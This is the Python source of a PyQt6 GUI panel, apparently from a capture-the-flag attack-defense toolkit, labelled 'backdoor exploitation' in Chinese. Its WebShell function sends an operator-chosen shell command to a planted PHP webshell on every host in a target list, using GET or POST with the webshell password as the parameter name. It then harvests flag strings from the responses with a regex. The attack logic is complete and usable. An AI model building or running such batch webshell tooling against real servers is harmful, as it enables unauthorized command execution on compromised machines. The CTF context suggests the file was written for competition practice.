import json
import logging
import re

import requests
from PyQt6.QtCore import Qt, pyqtSignal
from PyQt6.QtGui import QFont
from PyQt6.QtWidgets import QFrame, QWidget, QHBoxLayout, QVBoxLayout, QListWidgetItem
from qfluentwidgets import FluentIcon, ImageLabel, SubtitleLabel, CaptionLabel, TextEdit, LineEdit, \
    setFont, PushButton, ToolButton, ListWidget, ComboBox


class subWindow2(QFrame):
    addItemSignal = pyqtSignal(str)

    def __init__(self, fileUpdateEvent1, updateEvent2, parent=None):
        super().__init__(parent=parent)

        self.aliveHosts = []
        fileUpdateEvent1.registerListener(self.loadHosts)
        self._updateEvent = updateEvent2

        layout = QHBoxLayout(self)
        leftLayout = QVBoxLayout(self)
        rightLayout = QVBoxLayout(self)

        cover = 'resource/Archive2.png'
        self.image = ImageLabel(cover, self)
        self.image.scaledToHeight(290)
        self.image.setBorderRadius(8, 8, 8, 8)
        leftLayout.addWidget(self.image)

        subtitleLabel = '后门利用'
        self.subtitle = SubtitleLabel(subtitleLabel, self)
        setFont(self.subtitle, 24)
        self.subtitle.setFixedHeight(50)
        leftLayout.addWidget(self.subtitle, 1, Qt.AlignmentFlag.AlignLeft)

        execContainer = QWidget()
        pathLayout = QHBoxLayout(execContainer)
        self.pathLabel = CaptionLabel("后门路径", self)
        setFont(self.pathLabel, 18)
        self.icon = ToolButton(self)
        self.icon.setIcon(FluentIcon.CONNECT)
        self.path = LineEdit()
        self.path.setPlaceholderText("/a.php")
        self.execButton = PushButton("开始执行", self)
        self.method = ComboBox()
        items = ['POST', 'GET']
        self.method.addItems(items)
        pathLayout.addWidget(self.pathLabel)
        pathLayout.addWidget(self.icon)
        pathLayout.addWidget(self.path)
        pathLayout.addWidget(self.method)
        pathLayout.addWidget(self.execButton)
        leftLayout.addWidget(execContainer)

        paramContainer = QWidget()
        paramLayout = QHBoxLayout(paramContainer)
        self.passwdLabel = CaptionLabel("连接密码", self)
        setFont(self.passwdLabel, 18)
        self.passwd = LineEdit()
        self.passwd.setFixedWidth(150)
        self.passwd.setPlaceholderText("cmd")
        paramLayout.addWidget(self.passwdLabel)
        paramLayout.addWidget(self.passwd)
        self.commandLabel = CaptionLabel("命令", self)
        setFont(self.commandLabel, 18)
        self.command = LineEdit()
        self.command.setFixedWidth(150)
        self.command.setPlaceholderText("ls")
        paramLayout.addWidget(self.commandLabel)
        paramLayout.addWidget(self.command)
        self.regexLabel = CaptionLabel("regex", self)
        setFont(self.regexLabel, 18)
        self.regex = LineEdit()
        self.regex.setFixedWidth(150)
        self.regex.setPlaceholderText("flag")
        paramLayout.addWidget(self.regexLabel)
        paramLayout.addWidget(self.regex)
        paramLayout.addStretch(1)
        leftLayout.addWidget(paramContainer)

        listContainer = QWidget()
        listLayout = QHBoxLayout(listContainer)
        self.listLabel = CaptionLabel("[+]靶机列表", self)
        setFont(self.listLabel, 18)
        listLayout.addWidget(self.listLabel)
        leftLayout.addWidget(listContainer)

        self.list = ListWidget(self)
        self.list.setFixedHeight(320)
        self.list.setSelectionMode(self.list.SelectionMode.ExtendedSelection)
        self.addItemSlot("存活靶机")
        leftLayout.addWidget(self.list)
        leftLayout.setStretchFactor(self.list, 1)
        leftLayout.addStretch(1)

        self.logLabel = CaptionLabel("[*]执行日志", self)
        self.logLabel.setFixedHeight(50)
        setFont(self.logLabel, 20)
        rightLayout.addWidget(self.logLabel)
        self.log = TextEdit()
        textFont = QFont()
        textFont.setPointSize(14)
        self.log.setFont(textFont)
        self.log.setMinimumWidth(350)
        self.log.setReadOnly(True)
        rightLayout.addWidget(self.log)

        layout.addLayout(leftLayout)
        layout.addLayout(rightLayout)
        self.loadHosts()
        self.execButton.clicked.connect(self.WebShell)

    def addItemSlot(self, item):
        try:
            item = QListWidgetItem(item)
            itemFont = QFont()
            itemFont.setPointSize(14)
            item.setFont(itemFont)
            self.list.addItem(item)
        except Exception as e:
            logging.error(e)
            pass

    def loadHosts(self):
        try:
            self.list.clear()
            self.addItemSlot("存活靶机")
            with open('./data/ip.json', 'r', encoding='utf-8') as f:
                hosts = json.load(f)
                for host in hosts:
                    ip = host["ip"]
                    self.aliveHosts.append(ip)
                    self.addItemSlot(ip)
        except Exception as e:
            logging.error(e)

    def WebShell(self):
        path = self.path.text()
        method = self.method.currentText()
        passwd = self.passwd.text()
        command = self.command.text()
        regex = self.regex.text()
        if regex != "":
            regex += "{.*}"
        resultList = []

        try:
            with open('./data/ip.json', 'r', encoding='utf-8') as f:
                hosts = json.load(f)
            for host in hosts:
                ip = host["ip"]
                url = f"{ip}{path}"
                data = {passwd: command}
                res = ""
                if method == "GET":
                    res = requests.get(url, params=data, timeout=0.3)
                elif method == "POST":
                    res = requests.post(url, data=data, timeout=0.3)
                self.log.append(f"{url}: \n{res.text}")
                if regex != "":
                    result = re.findall(regex, res.text)
                    if result:
                        resultList.append(result[0])
            resultList.sort()
            with open('./data/flag.json', 'w', encoding='utf-8') as f:
                results = [{"flag": result} for result in resultList]
                json.dump(results, f)
            self._updateEvent.trigger()
        except Exception as e:
            logging.error(e)
            pass
